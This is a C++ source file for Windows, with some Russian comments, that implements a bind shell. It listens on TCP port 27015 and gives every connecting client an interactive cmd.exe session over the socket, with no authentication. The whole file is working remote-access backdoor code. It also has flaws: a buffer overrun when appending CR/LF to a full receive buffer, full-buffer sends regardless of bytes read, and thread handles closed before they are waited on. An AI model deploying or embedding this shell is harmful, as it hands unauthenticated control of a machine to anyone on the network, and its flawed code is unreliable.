#undef UNICODE

#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <string>
#include <iostream>
#include <vector>
#include <strsafe.h>




#pragma comment (lib, "Ws2_32.lib")

#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "27015"
#define BUFSIZE 4096 



using namespace std;


class Server
{
private:


    static WSADATA wsaData;
    static SOCKET ListenSocket;
    static string ip_address;
    static struct addrinfo* result;
    static struct addrinfo hints;


    static struct WORK_WITH_PIPE {
        HANDLE* g_hChildStd_IN_Rd = NULL;
        HANDLE* g_hChildStd_IN_Wr = NULL;
        HANDLE* g_hChildStd_OUT_Rd = NULL;
        HANDLE* g_hChildStd_OUT_Wr = NULL;

        SOCKET* ClientSocket = NULL;
    };
    //struct addrinfo* result = NULL;
    //struct addrinfo hints;

    //int iSendResult;
    //char recvbuf[DEFAULT_BUFLEN];
    //int recvbuflen = DEFAULT_BUFLEN;

    static void create_clients_connections()
    {

        SOCKET ClientSocket = INVALID_SOCKET;

        /*
            Принимаем входящие запросы
            и создаём потоки клиента (create_thread_client)
        */
        // Accept a client socket

        do
        {

            ClientSocket = accept(ListenSocket, NULL, NULL);

            if (ClientSocket == INVALID_SOCKET) {
                printf("accept failed with error: %d\n", WSAGetLastError());
                closesocket(ListenSocket);
                WSACleanup();
            }


            CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)create_thread_client, (LPVOID) new SOCKET(ClientSocket), NULL, NULL);
            // добавить WaitForMultipleObjects


        } while (true);


        closesocket(ListenSocket);
        WSACleanup();


    }
    static void create_thread_client(LPVOID param)
    {

        SOCKET* ClientSocket = (SOCKET*)param;
        int iResult = 0;

        HANDLE hThreads[2];

        // For pipes
        HANDLE g_hChildStd_IN_Rd = NULL;
        HANDLE g_hChildStd_IN_Wr = NULL;
        HANDLE g_hChildStd_OUT_Rd = NULL;
        HANDLE g_hChildStd_OUT_Wr = NULL;


        SECURITY_ATTRIBUTES saAttr;

        //printf("\n->Start of parent execution.\n");

        // Set the bInheritHandle flag so pipe handles are inherited. 

        saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
        saAttr.bInheritHandle = TRUE;
        saAttr.lpSecurityDescriptor = NULL;

        // Create a pipe for the child process's STDOUT. 

        if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0))
            exit(-1);
        // Ensure the read handle to the pipe for STDOUT is not inherited.

        if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
            exit(-1);

        // Create a pipe for the child process's STDIN. 

        if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0))
            exit(-1);

        // Ensure the write handle to the pipe for STDIN is not inherited. 

        if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
            exit(-1);

        // Create the child process. 

        WORK_WITH_PIPE* INFO = new WORK_WITH_PIPE;
        INFO->g_hChildStd_IN_Rd = &g_hChildStd_IN_Rd;
        INFO->g_hChildStd_IN_Wr = &g_hChildStd_IN_Wr;
        INFO->g_hChildStd_OUT_Rd = &g_hChildStd_OUT_Rd;
        INFO->g_hChildStd_OUT_Wr = &g_hChildStd_OUT_Wr;
        INFO->ClientSocket = ClientSocket;




        CreateChildProcess(g_hChildStd_OUT_Wr, g_hChildStd_IN_Rd);




        hThreads[0] = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)WriteToPipe, (LPVOID)INFO, NULL, NULL);
        hThreads[1] = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)ReadFromPipe, (LPVOID)INFO, NULL, NULL);
        CloseHandle(hThreads[0]);
        CloseHandle(hThreads[1]);

        WaitForMultipleObjects(2, hThreads, FALSE, INFINITE);

        cout << "Stop client" << endl;

        iResult = shutdown(*ClientSocket, SD_SEND);

        if (iResult == SOCKET_ERROR) {
            printf("shutdown failed with error: %d\n", WSAGetLastError());
            closesocket(*ClientSocket);
            WSACleanup();
            exit(-1);
        }



        closesocket(*ClientSocket);


        if (!CloseHandle(g_hChildStd_IN_Wr))
            exit(-1);



        delete ClientSocket;


    }

    static void CreateChildProcess(HANDLE g_hChildStd_OUT_Wr, HANDLE g_hChildStd_IN_Rd)
        // Create a child process that uses the previously created pipes for STDIN and STDOUT.
    {
        TCHAR szCmdline[10] = TEXT("cmd.exe");
        PROCESS_INFORMATION piProcInfo;
        STARTUPINFO siStartInfo;
        BOOL bSuccess = FALSE;

        // Set up members of the PROCESS_INFORMATION structure. 

        ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

        // Set up members of the STARTUPINFO structure. 
        // This structure specifies the STDIN and STDOUT handles for redirection.

        ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
        siStartInfo.cb = sizeof(STARTUPINFO);
        siStartInfo.hStdError = g_hChildStd_OUT_Wr;
        siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
        siStartInfo.hStdInput = g_hChildStd_IN_Rd;
        siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

        // Create the child process. 

        bSuccess = CreateProcess(
            NULL,
            szCmdline,     // command line 
            NULL,          // process security attributes 
            NULL,          // primary thread security attributes 
            TRUE,          // handles are inherited 
            0,             // creation flags 
            NULL,          // use parent's environment 
            NULL,          // use parent's current directory 
            &siStartInfo,  // STARTUPINFO pointer 
            &piProcInfo);  // receives PROCESS_INFORMATION 

        // If an error occurs, exit the application. 
        if (!bSuccess)
            exit(-1);
        else
        {
            // Close handles to the child process and its primary thread.
            // Some applications might keep these handles to monitor the status
            // of the child process, for example. 

            CloseHandle(piProcInfo.hProcess);
            CloseHandle(piProcInfo.hThread);

            // Close handles to the stdin and stdout pipes no longer needed by the child process.
            // If they are not explicitly closed, there is no way to recognize that the child process has ended.

            CloseHandle(g_hChildStd_OUT_Wr);
            CloseHandle(g_hChildStd_IN_Rd);
        }
    }
    static DWORD WINAPI WriteToPipe(LPVOID parametr)
    {
        WORK_WITH_PIPE* INFO = (WORK_WITH_PIPE*)parametr;

        DWORD dwRead, dwWritten;
        CHAR chBuf[BUFSIZE];
        BOOL bSuccess = FALSE;
        HANDLE hParentStdIn = GetStdHandle(STD_INPUT_HANDLE);

        int iResult;




        for (;;)
        {
            ZeroMemory(chBuf, BUFSIZE);

            iResult = recv(*(INFO->ClientSocket), chBuf, BUFSIZE, 0);


            //cout << chBuf << endl;
            int size = strlen(chBuf);
            chBuf[size] = '\r';
            chBuf[size + 1] = '\n';

            if (iResult > 0) {

                bSuccess = WriteFile(*(INFO->g_hChildStd_IN_Wr), chBuf, size + 2, &dwWritten, NULL);
                if (!bSuccess) return 1;

            }
            else {
                return 1;
            }


            /*bSuccess = ReadFile(hParentStdIn, chBuf, BUFSIZE, &dwRead, NULL);
            if (!bSuccess || dwRead == 0) return 1;

            for (int i = 0; i < 10; i++) {
                cout << int(chBuf[i]) << " ";
            }
            cout << endl;*/

            /*cin >> chBuf;
            int size = strlen(chBuf);
            chBuf[size] = '\r';
            chBuf[size + 1] = '\n';*/

            /*bSuccess = WriteFile(*(INFO->g_hChildStd_IN_Wr), chBuf, size + 2, &dwWritten, NULL);
            if (!bSuccess) return 1;*/


        }



    }
    static DWORD WINAPI ReadFromPipe(LPVOID parametr)
    {
        WORK_WITH_PIPE* INFO = (WORK_WITH_PIPE*)parametr;

        DWORD dwRead, dwWritten;
        CHAR chBuf[BUFSIZE];
        BOOL bSuccess = FALSE;
        HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

        int iResult;

        for (;;)
        {
            ZeroMemory(chBuf, BUFSIZE);

            bSuccess = ReadFile(*(INFO->g_hChildStd_OUT_Rd), chBuf, BUFSIZE, &dwRead, NULL);
            if (!bSuccess || dwRead == 0) break;


            //cout << chBuf << endl;

            /*bSuccess = WriteFile(hParentStdOut, chBuf,
                dwRead, &dwWritten, NULL);
            if (!bSuccess) break;*/


            iResult = send(*(INFO->ClientSocket), chBuf, BUFSIZE, 0);
            if (iResult == SOCKET_ERROR) {
                return 1;
            }

        }
        return 1;
    }
    // для множественного обслуживания

public:

    Server() {
        ip_address = "192.168.0.43";
    }

    Server(string ip_address) {
        this->ip_address = ip_address;
        ListenSocket = INVALID_SOCKET;
        result = NULL;
    }

    int Connected() {

        int iResult;


        iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);

        if (iResult != 0) {
            printf("WSAStartup failed with error: %d\n", iResult);
            return 1;
        }

        ZeroMemory(&hints, sizeof(hints));
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;
        hints.ai_flags = AI_PASSIVE;

        // Resolve the server address and port
        iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
        if (iResult != 0) {
            printf("getaddrinfo failed with error: %d\n", iResult);
            WSACleanup();
            return 1;
        }

        // Create a SOCKET for the server to listen for client connections.
        ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
        if (ListenSocket == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            freeaddrinfo(result);
            WSACleanup();
            return 1;
        }

        // Setup the TCP listening socket
        iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            printf("bind failed with error: %d\n", WSAGetLastError());
            freeaddrinfo(result);
            closesocket(ListenSocket);
            WSACleanup();
            return 1;
        }

        freeaddrinfo(result);


        cout << "Start listen socket" << endl;


        iResult = listen(ListenSocket, SOMAXCONN);
        if (iResult == SOCKET_ERROR) {
            printf("listen failed with error: %d\n", WSAGetLastError());
            closesocket(ListenSocket);
            WSACleanup();
            return 1;
        }



        CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)create_clients_connections, NULL, NULL, NULL);
        while (true);




        return 0;
    }



};
WSADATA Server::wsaData;
SOCKET Server::ListenSocket;
string Server::ip_address;
struct addrinfo* Server::result;
struct addrinfo Server::hints;







int main()
{

    Server server;
    server.Connected();

}
